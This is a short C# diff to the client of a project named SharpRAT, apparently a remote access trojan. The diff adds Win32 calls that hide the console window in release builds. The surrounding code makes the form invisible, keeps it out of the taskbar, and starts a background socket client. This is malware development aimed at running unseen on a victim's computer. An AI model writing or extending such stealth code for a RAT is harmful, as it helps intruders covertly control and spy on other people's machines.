@@ -1,13 +1,30 @@
 
+using System.Runtime.InteropServices;
+
 namespace Client
 {
     public partial class Main : Form
     {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
         private string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT";
         public static Client.SocketClient socketClient;
         public static RequestUI uiRequests;
         public Main()
         {
+            // Debugging purposes, console output visible.
+#if (DEBUG)
+            ShowWindow(GetConsoleWindow(), SW_SHOW);
+#else
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
+#endif
+
             uiRequests = new RequestUI();
             socketClient = new Client.SocketClient();
             InitializeComponent();
@@ -27,7 +44,7 @@ namespace Client
             clientThread.IsBackground = true;
             clientThread.Start();
 
-            // Start hidden.
+            // Start hidden. (For windows forms applications only)
             Opacity = 0.0f;
             ShowInTaskbar = false;
             MinimizeBox = true;
